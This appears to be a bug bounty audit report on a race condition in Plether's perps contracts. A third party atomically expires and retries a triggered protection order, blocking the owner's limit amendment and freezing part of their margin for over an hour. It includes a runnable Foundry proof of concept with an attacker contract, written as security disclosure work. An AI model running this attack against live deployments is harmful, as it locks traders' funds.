# \#98018 [SC-High] Permissionless expiry/retry race temporarily freezes part of trader margin for over one hour

**Submitted on Nov 4th 2026 at 12:17:48 UTC by @Rrudy for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98018
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour

## Description

## Summary

At the in-scope commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, an unrelated caller using public keeper entry points can preempt the transaction boundary at which an EOA trader may amend the financial limit of a triggered position protection. When the retained limit prevents the protected close from executing, the caller can atomically expire the child order and retry the protection. At the end of that transaction the protection is `Triggered` again with a new pending child, so the owner cannot amend the limit. Repeating this at successive child expiries can keep the position open and part of its margin inaccessible.

## Root cause

[`PositionProtectionBook.amendLatchedPositionProtectionCloseLimits`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328) requires both `status == Latched` and `pendingOrderCounts(owner) == 0`. [`retryPositionProtectionClose`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L405) is callable by anyone in that same state and creates a new pending child. A third-party contract calls public [`OrderRouter.expireOrder`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L191) followed by `retryPositionProtectionClose` in one transaction. If that transaction is included first at expiry, an ordinary EOA owner cannot insert an amendment between the two calls. Direct close and cancellation of the already triggered protection are rejected by their existing guards.

## Demonstrated impact (Medium: temporary freezing of funds for at least 1 hour)

The original-contract Foundry PoC sets a `9,995 USDG` maximum execution notional, which admits the initial `9,990 USDG` trigger notional. A permitted Pyth-mock mark update raises execution notional to `10,000 USDG`; a separate test verifies the child then fails with `ConstraintViolation / ExecutionNotional`. In the attack branch, an unrelated caller atomically expires and retries each child at 61 successive deadlines. Owner amendment remains rejected for **3,660 seconds measured from the first expiry opportunity**. At the same final timestamp, L2 block and mark, the attacker-first branch withdraws **17,999.600000 USDG**, while the owner-first control expires, amends, retries, closes and withdraws **19,991.599627 USDG**. Thus **1,991.999627 USDG** is additionally inaccessible relative to that matched exit path. This is a partial temporary access restriction; no theft, full-account freeze or permanent loss is claimed.

## Preconditions and limits

The valid execution price must stay outside the retained ceiling, and the attacker must win each expiry ordering race. The PoC constructs 61 attacker-first inclusions; it does not prove that inclusion priority is guaranteed on Arbitrum One or measure its gas cost or the frequency of a one-hour price interval. An owner whose expiry is followed by its amendment before a third-party retry can recover; so can an EIP-7702/smart-account owner whose atomic expiry-and-amend transaction is included first. A child execution after a valid price return or the attacker's cessation also ends the restriction. No trusted role, compromised signer or private keeper service is assumed.

## Distinction from published issues

[Cecuro MED-9 / PR #124](https://github.com/Plether-Fi/plether-core/pull/124) addressed automatic protection closes lacking an owner-selected financial ceiling and added owner amendment after relatch. This PoC verifies that the new ceiling works; the failing gate is the owner's **post-fix amendment window**. The published [Router and keeper limitation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1343-L1360) describes unpaid cleanup and prolonged `Latched` state **without** a live child. Here cleanup succeeds, but an unrelated caller immediately retries in the same transaction. Every attacker transaction ends `Triggered` **with** a live child, so the owner never sees the amendment state at a transaction boundary. The matched owner-first control closes and withdraws at the same final timestamp, block and mark. This isolates active preemption of the remedy introduced by PR #124, rather than a keeper failing to clean up or retry.

## Suggested fix

Give the owner an atomic expiry/amend/retry path, or allow a safe owner update of the pending protected child's bounds while preserving the existing authorization and settlement checks.

## Proof of Concept

## Reproduction steps

1. Use Foundry `1.5.1` and Solidity `0.8.35`. Obtain the exact competition source and pinned submodules:

   ```bash
   git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
   cd audit-comp-plether
   git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
   git submodule update --init --recursive
   ```

2. Save the complete Solidity test source below as `packages/perps/test/perps/spec/trader/IndependentLatchedRacePublicPath.t.sol`. Do not change any file under `packages/perps/src`.

3. Run from the repository root:

   ```bash
   FOUNDRY_PROFILE=audit forge test --root packages/perps \
     --match-path test/perps/spec/trader/IndependentLatchedRacePublicPath.t.sol \
     --match-contract IndependentLatchedRacePublicPathTest \
     --match-test test_Public --evm-version prague -vv
   ```

   The independent replay used the same test selection with `--offline` after dependencies and the compiler were already cached. The test uses only the original in-scope contract code. Pyth and USDG are the only mocked components and are outside the competition scope. `vm.warp`/`vm.roll` model elapsed deadlines and L2 blocks; `vm.prank` selects ordinary callers. No in-scope storage is overwritten.

4. Confirm **4 passed, 0 failed, 0 skipped**. The attack test asserts 61 consecutive atomic expiry/retry cycles, failed owner amendments, failed direct close/cancellation, and a real withdrawal of the remaining free balance. The owner-first control closes and withdraws at the identical final timestamp, L2 block and mark. The separate boundary tests check the initially valid limit, the later `ExecutionNotional` failure and the EIP-7702 recovery path.

5. Compare the decisive output (USDG has 6 decimals):

   ```text
   OWNER_AMEND_BLOCKED_FROM_FIRST_EXPIRY_SECONDS: 3660
   ATTACKER_FIRST_TIMESTAMP: 1709539324
   MATCHED_NO_ATTACK_TIMESTAMP: 1709539324
   ATTACKER_FIRST_BLOCK: 65
   MATCHED_NO_ATTACK_BLOCK: 65
   ATTACKER_FIRST_OWNER_WITHDRAWN_ATOMS: 17999600000
   MATCHED_NO_ATTACK_OWNER_WITHDRAWN_ATOMS: 19991599627
   Suite result: ok. 4 passed; 0 failed; 0 skipped
   ```

   `19,991,599,627 - 17,999,600,000 = 1,991,999,627` atoms, or **1,991.999627 USDG** of additional access in the owner-first control. The reproduced restriction lasts **3,660 seconds after the first amendment opportunity**. This is not a claim that the whole wallet is frozen.

The independently replayed test source has SHA-256 `ef2371e53cf1fbc5e2b11eb37c0bb71f314a9a67a3bdb9352e87febcec21bb46`; the saved complete replay stdout has SHA-256 `b050547b8eb83fcaa459e9f57abdfda2ebf6c4332d90b3a2d8916b2215163097`.

## Complete runnable Foundry test

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Public-route challenge: all in-scope state transitions use the pinned contracts' public entry points.
import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {LegacyOrderRouterHarness} from "../../../utils/LegacyOrderRouterHarness.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";

interface IPublicExpiryRouter {
    function expireOrder(uint64 orderId) external returns (OrderV3Types.ExecutionResult memory);
}

contract PublicKeeperAtomicRetry {
    function cycle(address routerAddress, address bookAddress, uint64 childId, uint64 protectionId)
        external
        returns (uint64 newChildId)
    {
        OrderV3Types.ExecutionResult memory expired = IPublicExpiryRouter(routerAddress).expireOrder(childId);
        require(expired.status == OrderV3Types.LifecycleStatus.Failed, "expiry expected");
        newChildId = IPositionProtectionActions(bookAddress).retryPositionProtectionClose(protectionId);
    }
}

contract PublicEoaRecovery {
    function expireAndAmend(
        address routerAddress,
        address bookAddress,
        uint64 childId,
        uint64 protectionId,
        PositionProtectionTypes.CloseFinancialLimits calldata limits
    ) external {
        OrderV3Types.ExecutionResult memory expired = IPublicExpiryRouter(routerAddress).expireOrder(childId);
        require(expired.status == OrderV3Types.LifecycleStatus.Failed, "expiry expected");
        IPositionProtectionActions(bookAddress).amendLatchedPositionProtectionCloseLimits(protectionId, limits);
    }
}

contract IndependentLatchedRacePublicPathTest is PositionProtectionTest {
    uint256 private constant TEST_ONLY_OWNER_KEY = 0x77b355;

    // BasePerpTest normally deploys a test-only subclass. Keep its setup and
    // typed helpers, but deploy the exact in-scope production router instead.
    function _deployLegacyOrderRouter(
        address engine_, address engineLens_, address pool_, address oracle_
    ) internal override returns (LegacyOrderRouterHarness deployedRouter) {
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook lifecycleBook =
            new OrderLifecycleBook(predictedRouter, engine_, address(clearinghouse), pool_);
        OrderRouterLiquidationBatchSidecar keeperSidecar =
            new OrderRouterLiquidationBatchSidecar(predictedRouter);
        OrderRouter exactRouter = new OrderRouter(
            engine_, engineLens_, pool_, oracle_, address(keeperSidecar),
            address(policyEvaluator), address(orderExecutionSidecar), address(lifecycleBook)
        );
        deployedRouter = LegacyOrderRouterHarness(address(exactRouter));
        assertEq(address(deployedRouter), predictedRouter);
        assertEq(keccak256(address(deployedRouter).code), keccak256(address(exactRouter).code));
    }

    function _publicTriggeredPosition()
        private
        returns (address owner, uint64 protectionId, uint64 childId)
    {
        owner = vm.addr(TEST_ONLY_OWNER_KEY);
        _fundTrader(owner, 20_000e6);
        uint256 triggerPrice = 99_900_000;
        PositionProtectionTypes.PositionProtectionParams memory params = _params(triggerPrice, 0);
        // The owner's original bound permits the 9,990 USDG trigger notional.
        // A 0.1% return to the 10,000 USDG mark makes this ordinary bound stale.
        params.closeLimits.maxExecutionNotionalAssets = 9_995e6;
        OrderV3Types.OrderRequest memory openRequest =
            _boundedOpenRequest(CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, 0);
        vm.prank(owner);
        (uint64 parentId, uint64 id) = protectionActions.commitOpenOrderWithProtection(openRequest, params);
        protectionId = id;
        bytes[] memory openData = _mockPythUpdateData(MARK_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory opened = router.executeOrder(parentId, openData);
        assertEq(uint8(opened.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        childId = _triggerAt(protectionId, triggerPrice);
        assertLt((POSITION_SIZE * triggerPrice) / 1e20, params.closeLimits.maxExecutionNotionalAssets);
        vm.warp(vm.getBlockTimestamp() + 30);
        vm.roll(vm.getBlockNumber() + 1);
        router.updateMarkPrice(_livePriceData(MARK_PRICE));
        assertGt((POSITION_SIZE * MARK_PRICE) / 1e20, params.closeLimits.maxExecutionNotionalAssets);
    }

    function _raisedLimits() private pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: 25_000e6,
            maxGrossAccountDebitAssets: 25_000e6,
            maxActionChargeAssets: 25_000e6,
            maxExplicitFeesAssets: 25_000e6
        });
    }

    function test_PublicMatchedNoAttackOwnerExitAndWithdrawal() public {
        (address owner, uint64 protectionId, uint64 childId) = _publicTriggeredPosition();
        uint256 start = vm.getBlockTimestamp();
        vm.warp(start + 3690);
        vm.roll(vm.getBlockNumber() + 60);
        router.updateMarkPrice(_livePriceData(MARK_PRICE));
        OrderV3Types.ExecutionResult memory expired = router.expireOrder(childId);
        assertEq(uint8(expired.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        vm.prank(owner);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _raisedLimits());
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory priceData = _mockPythUpdateData(MARK_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory executed = router.executeOrder(retryId, priceData);
        assertEq(uint8(executed.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 size,,,,,,) = engine.positions(owner);
        assertEq(size, 0, "matched control closes position");
        uint256 withdrawable = clearinghouse.balanceAssets(owner);
        vm.prank(owner);
        clearinghouse.withdrawMargin(withdrawable);
        emit log_named_uint("MATCHED_NO_ATTACK_SECONDS", vm.getBlockTimestamp() - start);
        emit log_named_uint("MATCHED_NO_ATTACK_TIMESTAMP", vm.getBlockTimestamp());
        emit log_named_uint("MATCHED_NO_ATTACK_BLOCK", vm.getBlockNumber());
        emit log_named_uint("MATCHED_NO_ATTACK_OWNER_WITHDRAWN_ATOMS", withdrawable);
        emit log_named_uint("MATCHED_NO_ATTACK_OWNER_WALLET_ATOMS", settlementToken.balanceOf(owner));
    }

    function test_PublicInitiallyUsableLimitFailsAfterValidMarkMove() public {
        _startRecordingLogs();
        (, uint64 protectionId, uint64 childId) = _publicTriggeredPosition();
        assertEq(router.lifecycleBook().pendingPolicy(childId).maxExecutionNotionalAssets, 9_995e6);
        bytes[] memory executionData = _mockPythUpdateData(MARK_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(childId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        OrderV3Types.CompactOutcome memory outcome =
            _verifiedOutcome(IOrderLifecycleBook(address(router.lifecycleBook())), childId);
        assertEq(uint8(outcome.failedConstraint), uint8(OrderV3Types.ConstraintKind.ExecutionNotional));
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
        );
        emit log_named_uint("NORMAL_INITIAL_LIMIT_CURRENT_MARK_EXECUTION_NOTIONAL_REJECT", 1);
    }

    function test_PublicAttackerFirstBlocksOwnerExitAndAdditionalWithdrawal() public {
        (address owner, uint64 protectionId, uint64 childId) = _publicTriggeredPosition();
        PublicKeeperAtomicRetry attacker = new PublicKeeperAtomicRetry();
        uint256 start = vm.getBlockTimestamp();
        uint256 firstOwnerAmendOpportunity;
        for (uint256 i; i < 61; ++i) {
            vm.warp(uint256(router.lifecycleBook().orderTiming(childId).executionDeadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);
            if (i == 0) firstOwnerAmendOpportunity = vm.getBlockTimestamp();
            childId = attacker.cycle(address(router), address(protectionBook), childId, protectionId);
            assertEq(router.pendingOrderCounts(owner), 1, "attacker leaves a pending child at every boundary");
            vm.prank(owner);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _raisedLimits());
        }
        uint256 elapsed = vm.getBlockTimestamp() - start;
        assertGt(elapsed, 1 hours, "repeated attacker-first cycles span one hour");
        uint256 ownerBlockedSeconds = vm.getBlockTimestamp() - firstOwnerAmendOpportunity;
        assertGt(ownerBlockedSeconds, 1 hours, "owner amendment is denied for one hour after first expiry");
        router.updateMarkPrice(_livePriceData(MARK_PRICE));
        OrderV3Types.OrderRequest memory directClose = _publicBoundedRequest(keccak256("owner-direct-close"), true);
        directClose.bounds.submitBy = uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds());
        vm.prank(owner);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(directClose);
        vm.prank(owner);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);
        vm.prank(owner);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _raisedLimits());
        uint256 balance = clearinghouse.balanceAssets(owner);
        uint256 free = clearinghouse.getFreeBuyingPowerAssets(owner);
        assertGt(balance - free, 1_000e6, "at least 1000 USDG remains committed");
        vm.prank(owner);
        vm.expectRevert(MarginClearinghouse.MarginClearinghouse__InsufficientFreeEquity.selector);
        clearinghouse.withdrawMargin(balance - 1_000e6);
        vm.prank(owner);
        clearinghouse.withdrawMargin(free);
        assertEq(settlementToken.balanceOf(owner), free, "maximum free balance remains accessible");
        (uint256 size,,,,,,) = engine.positions(owner);
        assertEq(size, POSITION_SIZE, "attacker-first branch cannot close position");
        emit log_named_uint("ATTACKER_FIRST_SECONDS", elapsed);
        emit log_named_uint("OWNER_AMEND_BLOCKED_FROM_FIRST_EXPIRY_SECONDS", ownerBlockedSeconds);
        emit log_named_uint("ATTACKER_FIRST_TIMESTAMP", vm.getBlockTimestamp());
        emit log_named_uint("ATTACKER_FIRST_BLOCK", vm.getBlockNumber());
        emit log_named_uint("ATTACKER_FIRST_SETTLEMENT_ATOMS", balance);
        emit log_named_uint("ATTACKER_FIRST_FREE_ATOMS", free);
        emit log_named_uint("ATTACKER_FIRST_OWNER_WITHDRAWN_ATOMS", free);
    }

    function test_PublicOpenAttackAndEip7702EoaRecovery() public {
        address owner = vm.addr(TEST_ONLY_OWNER_KEY);
        _fundTrader(owner, 20_000e6);

        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        params.closeLimits.maxExecutionNotionalAssets = 1e6;
        OrderV3Types.OrderRequest memory openRequest =
            _boundedOpenRequest(CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, 0);
        vm.prank(owner);
        (uint64 parentId, uint64 protectionId) = protectionActions.commitOpenOrderWithProtection(
            openRequest, params
        );

        bytes[] memory openData = _mockPythUpdateData(MARK_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory opened = router.executeOrder(parentId, openData);
        assertEq(uint8(opened.status), uint8(OrderV3Types.LifecycleStatus.Executed), "public open executes");
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Armed),
            "public parent arms protection"
        );

        uint64 childId = _triggerAt(protectionId, LONG_TAKE_PROFIT);
        PublicKeeperAtomicRetry attacker = new PublicKeeperAtomicRetry();
        uint256 start = vm.getBlockTimestamp();
        emit log_named_uint("PUBLIC_START_TIMESTAMP", start);
        emit log_named_uint("PUBLIC_FIRST_CHILD_ID", childId);
        for (uint256 i; i < 61; ++i) {
            uint256 deadline = uint256(router.lifecycleBook().orderTiming(childId).executionDeadline);
            if (i == 0 || i == 60) emit log_named_uint("PUBLIC_CHILD_DEADLINE", deadline);
            vm.warp(deadline + 1);
            childId = attacker.cycle(address(router), address(protectionBook), childId, protectionId);
            assertEq(router.pendingOrderCounts(owner), 1);
        }
        uint256 end = vm.getBlockTimestamp();
        emit log_named_uint("PUBLIC_END_TIMESTAMP", end);
        assertGt(end - start, 1 hours);
        emit log_named_uint("PUBLIC_PATH_OWNER_ORDINARY_AMEND_BLOCKED_SECONDS", end - start);

        vm.warp(uint256(router.lifecycleBook().orderTiming(childId).executionDeadline) + 1);
        PublicEoaRecovery implementation = new PublicEoaRecovery();
        PositionProtectionTypes.CloseFinancialLimits memory newLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: 25_000e6,
            maxGrossAccountDebitAssets: 25_000e6,
            maxActionChargeAssets: 25_000e6,
            maxExplicitFeesAssets: 25_000e6
        });
        vm.prank(owner);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, newLimits);
        vm.signAndAttachDelegation(address(implementation), TEST_ONLY_OWNER_KEY);
        vm.prank(owner, owner);
        PublicEoaRecovery(owner).expireAndAmend(
            address(router), address(protectionBook), childId, protectionId, newLimits
        );
        assertEq(protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets, 25_000e6);
        assertEq(router.pendingOrderCounts(owner), 0);
        emit log_named_uint("PUBLIC_PATH_EOA_7702_RECOVERY", 1);
    }
}
```

